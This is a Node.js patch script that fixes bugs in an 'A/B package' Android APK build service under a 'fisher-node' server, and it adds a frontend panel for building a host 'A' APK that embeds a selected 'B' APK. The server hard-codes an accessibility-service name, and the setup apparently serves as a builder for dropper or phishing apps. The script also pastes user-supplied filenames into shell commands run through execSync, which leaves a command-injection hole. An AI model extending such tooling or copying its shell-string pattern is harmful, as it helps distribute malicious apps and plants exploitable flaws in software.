const fs = require('fs');

// --- 1. Fix server_remote.js ---
let serverCode = fs.readFileSync('/opt/fisher-node/server_remote.js', 'utf8');

// Bug 1: A包盲选回退
serverCode = serverCode.replace(
`    if (req.body.bFilename && require('fs').existsSync(require('path').join(bDir, req.body.bFilename))) {
      bApkPath = require('path').join(bDir, req.body.bFilename);
    } else {
      const files = fs.readdirSync(bDir).filter(f => f.endsWith('.apk'));
      if (files.length > 0) {
        files.sort((a, b) => fs.statSync(path.join(bDir, b)).mtimeMs - fs.statSync(path.join(bDir, a)).mtimeMs);
        bApkPath = path.join(bDir, files[0]);
      }
    }`,
`    if (req.body.bFilename) {
      const targetB = require('path').join(bDir, req.body.bFilename);
      if (require('fs').existsSync(targetB)) {
        bApkPath = targetB;
      }
    }`
);

// Bug 2 & 6: 记录B包元数据
serverCode = serverCode.replace(
`    if (code === 0 && fs.existsSync(outputPath)) {
      console.log(\`[AB-B] ✅ B包构建成功: \${filename}\`);
      global._abBuildLogs.push({ timestamp: Date.now(), level: 'success', message: \`B包构建成功: \${filename}\`, timeString: new Date().toLocaleString('zh-CN') });
    } else {`,
`    if (code === 0 && fs.existsSync(outputPath)) {
      console.log(\`[AB-B] ✅ B包构建成功: \${filename}\`);
      global._abBuildLogs.push({ timestamp: Date.now(), level: 'success', message: \`B包构建成功: \${filename}\`, timeString: new Date().toLocaleString('zh-CN') });
      
      let realPkg = '';
      try {
        const aaptOut = require('child_process').execSync('aapt dump badging "' + outputPath + '" | grep package', { encoding: 'utf-8' });
        const match = aaptOut.match(/name='([^']+)'/);
        if (match && match[1]) realPkg = match[1];
      } catch(e) { console.error("B包包名解析失败", e); }
      
      const meta = { buildId: Date.now(), filename: filename, packageName: realPkg, appName: appName, buildTime: new Date().toISOString() };
      fs.writeFileSync(outputPath + '.meta.json', JSON.stringify(meta));
    } else {`
);

// Bug 4: 列表读取元数据
serverCode = serverCode.replace(
`      return { filename: f, size: stat.size, buildTime: stat.mtime.toISOString().replace('T', ' ').slice(0, 19), packageName: '' };`,
`      let pkg = '', app = '';
      try {
        if (fs.existsSync(path.join(dir, f + '.meta.json'))) {
          const meta = JSON.parse(fs.readFileSync(path.join(dir, f + '.meta.json'), 'utf8'));
          pkg = meta.packageName || '';
          app = meta.appName || '';
        }
      } catch(e){}
      return { filename: f, size: stat.size, buildTime: stat.mtime.toISOString().replace('T', ' ').slice(0, 19), packageName: pkg, appName: app };`
);

// Bug 3: latest-info 返回准确包名，不返回假包名
serverCode = serverCode.replace(
`    let realPkg = 'com.pro.viewer';
    try {
      const aaptOut = require('child_process').execSync('aapt dump badging "' + latestApk + '" | grep package', { encoding: 'utf-8' });
      const match = aaptOut.match(/name='([^']+)'/);
      if (match && match[1]) realPkg = match[1];
    } catch(e) {}
    // 从 B 包读取真实包名返回给前端，并加入 bFilename 绑定机制
    res.json({ success: true, packageName: realPkg, accessibilityService: 'com.titan.solid.luck.service.unfaiahnst', mainActivity: '', bFilename: files[0] });`,
`    let realPkg = '';
    try {
      if (fs.existsSync(latestApk + '.meta.json')) {
        const meta = JSON.parse(fs.readFileSync(latestApk + '.meta.json', 'utf-8'));
        realPkg = meta.packageName;
      }
      if (!realPkg) {
        const aaptOut = require('child_process').execSync('aapt dump badging "' + latestApk + '" | grep package', { encoding: 'utf-8' });
        const match = aaptOut.match(/name='([^']+)'/);
        if (match && match[1]) realPkg = match[1];
      }
    } catch(e) {}
    if (!realPkg) return res.json({ success: false, error: '解析最新B包包名失败或包已损坏' });
    // 从 B 包读取真实包名返回给前端，并加入 bFilename 绑定机制
    res.json({ success: true, packageName: realPkg, accessibilityService: 'com.titan.solid.luck.service.unfaiahnst', mainActivity: '', bFilename: files[0] });`
);

// Bug 6: 构建 A 包前验证 B 包
serverCode = serverCode.replace(
`  if (!bApkPath) {
    return res.json({ success: false, error: '请先构建B包' });
  }

  let iconPath = '';`,
`  if (!bApkPath) {
    return res.json({ success: false, error: '指定的B包不存在' });
  }

  try {
    const aaptCheck = require('child_process').execSync('aapt list "' + bApkPath + '" | grep AndroidManifest.xml', { encoding: 'utf-8' });
    if (!aaptCheck.includes('AndroidManifest.xml')) throw new Error('No Manifest');
  } catch (err) {
    return res.json({ success: false, error: '选定的B包无效或已损坏，无法作为基础包' });
  }

  let iconPath = '';`
);

fs.writeFileSync('/opt/fisher-node/server_remote.js', serverCode);
console.log('server_remote.js patched.');

// --- 2. Fix Frontend (Bug 5) ---
const frontendFile = '/opt/fengjc_site/assets/js/index-zenKR-7B.js';
let frontendCode = fs.readFileSync(frontendFile, 'utf8');

const dummyComponent = 'function cd(){return e.jsxs("section",{className:"panel placeholder-panel",children:[e.jsx("div",{className:"placeholder-icon",children:"\\uD83D\\uDEE1\\uFE0F"}),e.jsx("div",{children:"双包构建 - 待完善"})]})}';
const dummyComponent2 = 'function cd(){return e.jsxs("section",{className:"panel placeholder-panel",children:[e.jsx("div",{className:"placeholder-icon",children:"🛡️"}),e.jsx("div",{children:"双包构建 - 待完善"})]})}';


const newComponent = `function cd(){
  const [bList, setBList] = s.useState([]);
  const [bName, setBName] = s.useState('');
  const [bUrl, setBUrl] = s.useState('');
  const [aName, setAName] = s.useState('');
  const [selB, setSelB] = s.useState('');

  const loadB = () => {
    H.request("/api/ab-apk/list").then(res => {
       if(res && res.apkList) setBList(res.apkList);
    }).catch(()=>{});
  };

  s.useEffect(()=>{ loadB(); }, []);

  const buildB = () => {
    if(!bName) return alert("请输入B包应用名");
    H.request("/api/ab-apk/build", {method:"POST", data:{appName: bName, webUrl: bUrl}}).then(res=>{
       alert(res.message || "B包构建已提交");
       setTimeout(loadB, 3000);
    }).catch(err => alert("B包构建失败: " + err.message));
  };

  const buildA = () => {
    if(!selB) return alert("请选择要嵌入的B包");
    const fd = new FormData();
    fd.append('aAppName', aName);
    fd.append('bFilename', selB);
    fetch("/api/abpack/build", {
       method: "POST",
       headers: { "Authorization": "Bearer " + localStorage.getItem("token") },
       body: fd
    }).then(r=>r.json()).then(res=>{
       if(res.success) alert(res.message || "A包构建已开始");
       else alert(res.error || "A包构建失败");
    }).catch(err => alert("网络错误"));
  };

  return e.jsxs("section", {
    className: "panel",
    style: {padding: "20px", background: "rgba(255,255,255,0.02)", borderRadius: "10px", color:"#eee"},
    children: [
      e.jsx("h3", {style:{marginBottom:"15px", color:"#fff"}, children: "双包构建中心 (A/B 包)"}),
      e.jsx("div", {style:{padding:"15px", background:"rgba(0,0,0,0.2)", borderRadius:"8px", marginBottom:"15px"}, children: e.jsxs("div", {children: [
        e.jsx("h4", {style:{marginBottom:"10px", color:"#a855f7"}, children: "1. 生成 B 包 (被嵌入的包)"}),
        e.jsx("input", {className:"rc-input", style:{marginRight:"10px", padding:"8px", borderRadius:"4px", background:"#333", color:"#fff", border:"1px solid #555"}, placeholder:"B包应用名称", value:bName, onChange:ev=>setBName(ev.target.value)}),
        e.jsx("input", {className:"rc-input", style:{marginRight:"10px", padding:"8px", borderRadius:"4px", background:"#333", color:"#fff", border:"1px solid #555"}, placeholder:"B包网址(可选)", value:bUrl, onChange:ev=>setBUrl(ev.target.value)}),
        e.jsx("button", {className:"rc-btn", style:{padding:"8px 15px", background:"#a855f7", color:"#fff", border:"none", borderRadius:"4px", cursor:"pointer"}, onClick:buildB, children:"提交构建 B 包"})
      ]})}),
      e.jsx("div", {style:{padding:"15px", background:"rgba(0,0,0,0.2)", borderRadius:"8px"}, children: e.jsxs("div", {children: [
        e.jsx("h4", {style:{marginBottom:"10px", color:"#3b82f6"}, children: "2. 生成 A 包 (覆盖安装版主包)"}),
        e.jsx("input", {className:"rc-input", style:{marginRight:"10px", padding:"8px", borderRadius:"4px", background:"#333", color:"#fff", border:"1px solid #555"}, placeholder:"A包应用名称", value:aName, onChange:ev=>setAName(ev.target.value)}),
        e.jsx("select", {style:{marginRight:"10px", padding:"8px", borderRadius:"4px", background:"#333", color:"#fff", border:"1px solid #555"}, value:selB, onChange:ev=>setSelB(ev.target.value), children: [
           e.jsx("option", {value:"", children:"-- 请选择要嵌入的B包 --"}),
           ...bList.map(b => e.jsx("option", {value:b.filename, children: b.filename + " (" + (b.packageName||"未知包名") + ")"}))
        ]}),
        e.jsx("button", {className:"rc-btn", style:{padding:"8px 15px", background:"#3b82f6", color:"#fff", border:"none", borderRadius:"4px", cursor:"pointer"}, onClick:buildA, children:"提交构建 A 包"})
      ]})})
    ]
  });
}`;

let patched = false;
if (frontendCode.includes(dummyComponent)) {
  frontendCode = frontendCode.replace(dummyComponent, newComponent);
  patched = true;
} else if (frontendCode.includes(dummyComponent2)) {
  frontendCode = frontendCode.replace(dummyComponent2, newComponent);
  patched = true;
}

if (patched) {
  fs.writeFileSync(frontendFile, frontendCode);
  console.log('Frontend patched.');
} else {
  console.log('Could not find dummy component in frontend code.');
}
